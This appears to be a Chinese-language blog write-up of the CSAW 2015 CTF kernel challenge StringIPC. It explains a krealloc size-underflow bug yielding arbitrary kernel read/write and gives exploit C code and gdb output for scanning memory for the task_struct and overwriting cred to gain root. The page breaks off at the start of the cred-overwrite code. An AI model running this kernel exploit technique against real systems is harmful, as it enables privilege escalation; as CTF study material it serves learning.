<!DOCTYPE html><html class="appearance-dark"><head><meta charset="UTF-8"><title>kernel_pwn SringsIPC(P1)</title><meta name="description" content="May the Force be with you"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="Kernel_pwn SringsIPC(P1)
从任意地址读写到提权的三种方法：1.修改cred结构体2.改写vdso映射函数+反弹shell3.劫持prctl执行过程的hp-&amp;gt;hook指针

这道题来自csaw-2015-ctf也是一道经典的内核题了，花了蛮久的时间去复现🤦


这题只给了程序的源代码main.c，需要我们自己搭建环境。我是懒狗，直接用了p4nda师傅的镜像和文件系统（十分感谢！😍）。根据题目的名字猜测可能是实现了进程间通信过程中的的信箱机制（正好最近在做操作系统的IPC实验），但实际上是我想多了。
分析源码发现程序实现了对一片内存区域的申请，释放，读写，扩容，查寻操作。漏洞点在扩容操作(realloc)函数中：
12345678910111213141516171819202.."><meta name="generator" content="Hexo 6.2.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">An9Ela's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">kernel_pwn SringsIPC(P1)</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">点击返回顶部</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-pwn-SringsIPC-P1"><span class="toc-text">Kernel_pwn SringsIPC(P1)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9%E8%BF%9B%E7%A8%8Bcred%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">1.修改进程cred结构体</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a><a href="/tags/KERNEL"><i class="tag post-item-tag">KERNEL</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">kernel_pwn SringsIPC(P1)</h1><time class="has-text-grey" datetime="2020-11-20T12:40:20.000Z">2020-11-20</time><article class="mt-2 post-content"><h3 id="Kernel-pwn-SringsIPC-P1"><a href="#Kernel-pwn-SringsIPC-P1" class="headerlink" title="Kernel_pwn SringsIPC(P1)"></a>Kernel_pwn SringsIPC(P1)</h3><blockquote>
<p>从任意地址读写到提权的三种方法：<br>1.修改cred结构体<br>2.改写vdso映射函数+反弹shell<br>3.劫持prctl执行过程的hp-&gt;hook指针</p>
</blockquote>
<p>这道题来自csaw-2015-ctf也是一道经典的内核题了，花了蛮久的时间去复现🤦</p>
<span id="more"></span>

<p>这题只给了程序的源代码main.c，需要我们自己搭建环境。我是懒狗，直接用了p4nda师傅的镜像和文件系统（十分感谢！😍）。<br>根据题目的名字猜测可能是实现了进程间通信过程中的的信箱机制（正好最近在做操作系统的IPC实验），但实际上是我想多了。</p>
<p>分析源码发现程序实现了对一片内存区域的申请，释放，读写，扩容，查寻操作。<br>漏洞点在扩容操作(realloc)函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">realloc_ipc_channel</span> <span class="params">( <span class="keyword">struct</span> ipc_state *state, <span class="type">int</span> id, <span class="type">size_t</span> size, <span class="type">int</span> grow )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="type">size_t</span> new_size;</span><br><span class="line">    <span class="type">char</span> *new_data;</span><br><span class="line"></span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line"></span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line"></span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>krealloc函数new_size是由channel-&gt;buf_size-size得到的，这两个值都可控，从而可以使得new_size+1&#x3D;&#x3D;0。根据krealloc函数源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment"> * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment"> * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment"> * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment"> * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment"> * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return: pointer to the allocated memory or %NULL in case of error</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">krealloc</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p, <span class="type">size_t</span> new_size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">		kfree(p);</span><br><span class="line">		<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_krealloc(p, new_size, flags);</span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; kasan_reset_tag(p) != kasan_reset_tag(ret))</span><br><span class="line">		kfree(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果传入的size为0，会返回ZERO_SIZE_PTR(<code>#define ZERO_SIZE_PTR ((void *)16)</code>)，即为0x10(而不是0!!!)，此时有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel-&gt;buf_size = new_size == 0x10</span><br><span class="line">channel-&gt;buf_size = new_size == 0xffffffffffffffff(size_t无符号)</span><br></pre></td></tr></table></figure>
<p>如果将channel-&gt;index赋值为target_addr-0x10，根据read&#x2F;write的功能可以绕过size的限制从而实现任意地址读写🙌。</p>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>可以任意地址读写了，要如何提权呢？共学到了三种姿势</p>
<h5 id="1-修改进程cred结构体"><a href="#1-修改进程cred结构体" class="headerlink" title="1.修改进程cred结构体"></a>1.修改进程cred结构体</h5><p>做过了babydriver那题就比较容易想到的要修改cred结构体了，但要怎么找到cred的地址呢？虽然我们已经可以任意地址读了，但要读哪里才能读到cred呢？头大。。。<br>看了raycp师傅的博客学到了寻找cred结构体的方法tql！。<br>首先线程由于要使用所属进程的资源，在其thread_info结构块中有一个struct task_struct类型的结构体，其内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct &#123;</span><br><span class="line">...</span><br><span class="line">/* process credentials */</span><br><span class="line">conststruct cred __rcu *ptracer_cred; /* Tracer&#x27;s credentials at attach */</span><br><span class="line">conststruct cred __rcu *real_cred; /* objective and real subjective task</span><br><span class="line">* credentials (COW) */</span><br><span class="line">conststruct cred __rcu *cred;    /* effective (overridable) subjective task</span><br><span class="line">* credentials (COW) */</span><br><span class="line">char comm[TASK_COMM_LEN]; /* executable name excluding path</span><br><span class="line">- access with[gs]et_task_comm (which lock</span><br><span class="line">                       it with task_lock())</span><br><span class="line">- initialized normally by setup_new_exec */</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到我们所关心的<code>conststruct cred __rcu *cred; conststruct cred __rcu *real_cred;</code>,还有一个重要的地方在于<code>char comm[TASK_COMM_LEN];</code>，这个字符数组保存了进程的名字，也为我们寻找cred提供了方法。<br>首先，task_struct所需的内存是动态分配得到的，我们知道通过<code>kmem_cache_alloc_node</code>函数申请的空间是在内核的动态分配区域。通过下面的内核映射空间可以确定爆破的范围在0xffff880000000000~0xffffc80000000000。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8M                 |           | unused hole                                   |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|</span><br><span class="line">    1M                 |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|</span><br><span class="line">    548K               |           | vsyscalls                                     |+++++++++++++|</span><br><span class="line">0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|</span><br><span class="line">    5M                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|</span><br><span class="line">    2G                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    64G                |           | EFI region mapping space                      |+++++++++++++|</span><br><span class="line">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    444G               |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | %esp fixup stacks                             |+++++++++++++|</span><br><span class="line">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    3T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|</span><br><span class="line">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|</span><br><span class="line">    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|</span><br><span class="line">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|</span><br><span class="line">    32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|</span><br><span class="line">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|</span><br><span class="line">                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">                       |-----------| hole caused by [48:63] sign extension         |-------------|</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|</span><br><span class="line">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |  user space |</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">    128T               |           | different per mm                              |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+</span><br></pre></td></tr></table></figure>
<p>还有这里介绍一个关键的函数int prctl( int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )，这是一个系统函数，是为进程制定而设计的。内核对应的处理函数为SYSCALL_DEFINE5()。<br>其中第一个参数option指定操作类型，如指定PR_SET_NAME，即设置进程名，之后的参数即为补充参数。<br>因此我们可以通过执行prctl(PR_SET_NAME,target)即可完成对进程名的设定。</p>
<p>因此利用方法就很明确了：<br>1.prctl函数设置进程明。<br>2.利用ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel)触发漏洞(channel-&gt;date&#x3D;0x10 channel-&gt;buf_size&#x3D;0xffffffffffffffff)。<br>3.利用任意地址读在0xffff880000000000~0xffffc80000000000范围内利用memmem()函数寻找进程名字符串<code>char comm[TASK_COMM_LEN]</code>。<br>4.找到cred地址后利用任意地址写修改uidgid为0</p>
<p>触发漏洞：<br>call krealloc时寄存器状态：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0xffffffffffffffff</span><br><span class="line">$rbx   : 0xffff88001f9411e0  →  0x0000000100000002  →  0x0000000100000002</span><br><span class="line">$rcx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rdx   : 0x00000000024000c0  →  0x00000000024000c0</span><br><span class="line">$rsp   : 0xffff88001f9e3e28  →  0xffff88001f9c5908  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rbp   : 0xffff88001f9e3e48  →  0xffff88001f9e3e98  →  0xffff88001f9e3f08  →  0xffff88001f9e3f48  →  0x00007fffde817950  →  0x0000000000401c70  →  0x2b54c73d8d4c5741  →  0x2b54c73d8d4c5741</span><br><span class="line">$rsi   : 0x0000000000000000  →  0x0000000000000000    //new_size</span><br><span class="line">$rdi   : 0xffff88001fa10a00  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rip   : 0xffffffffc00001a6  →  0xc08548c11a1355e8  →  0xc08548c11a1355e8</span><br><span class="line">$r8    : 0x0000000000000101  →  0x0000000000000101</span><br><span class="line">$r9    : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r10   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r11   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r12   : 0xffffffffffffffff</span><br><span class="line">$r13   : 0x0000000000000101  →  0x0000000000000101</span><br><span class="line">$r14   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r15   : 0x00007fffde817890  →  0x00007fff00000001  →  0x00007fff00000001</span><br></pre></td></tr></table></figure>
<p>返回值<code>$rax   : 0x0000000000000010  →  0x0000000000000010</code></p>
<p>赋值时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">→ 0xffffffffc00001b0 &lt;realloc_ipc_channel.isra+80&gt; mov    QWORD PTR [rbx+0x8], rax</span><br><span class="line">   0xffffffffc00001b4 &lt;realloc_ipc_channel.isra+84&gt; mov    QWORD PTR [rbx+0x10], r12</span><br><span class="line"></span><br><span class="line">$rax   : 0x0000000000000010  →  0x0000000000000010</span><br><span class="line">$r12   : 0xffffffffffffffff</span><br></pre></td></tr></table></figure>

<p>寻找cred:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">for</span>(;addr &lt; <span class="number">0xffffc80000000000</span>;addr += <span class="number">0x1000</span>)&#123;</span><br><span class="line">       seek_channel.id = alloc_channel.id;</span><br><span class="line">       seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">       seek_channel.whence = SEEK_SET;</span><br><span class="line">       ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">       read_channel.id = alloc_channel.id;</span><br><span class="line">       read_channel.buf = buf;</span><br><span class="line">       read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">       ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line">       result = memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">       <span class="keyword">if</span> (result)</span><br><span class="line">	&#123;</span><br><span class="line">		cred = *(<span class="type">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">		real_cred = *(<span class="type">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line">			<span class="comment">//printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span></span><br><span class="line">			target_addr = addr + result-(<span class="type">int</span>)(buf);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/40gx 0xffff8800002034c0-0x30     //task_struct</span><br><span class="line">0xffff880000203490:	0xffff880019788968	0xffff880019788978</span><br><span class="line">0xffff8800002034a0:	0xffff880019788978	0x0000000000000000</span><br><span class="line">0xffff8800002034b0:	0xffff88001f9c2600	0xffff88001f9c2600  //cred_addr</span><br><span class="line">0xffff8800002034c0:	0x3939393939396e61	0x00616c6539393939  //comm</span><br><span class="line">0xffff8800002034d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">gef➤  x/30gx 0xffff88001f9c2600    //cred</span><br><span class="line">0xffff88001f9c2600:	0xffff88001f9c2900	0x000003e8000003e8</span><br><span class="line">0xffff88001f9c2610:	0x000003e8000003e8	0x000003e8000003e8</span><br><span class="line">0xffff88001f9c2620:	0x00000000000003e8	0x0000000000000000</span><br><span class="line">0xffff88001f9c2630:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88001f9c2640:	0x0000003fffffffff	0x0000000000000000</span><br><span class="line">0xffff88001f9c2650:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>改写cred:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 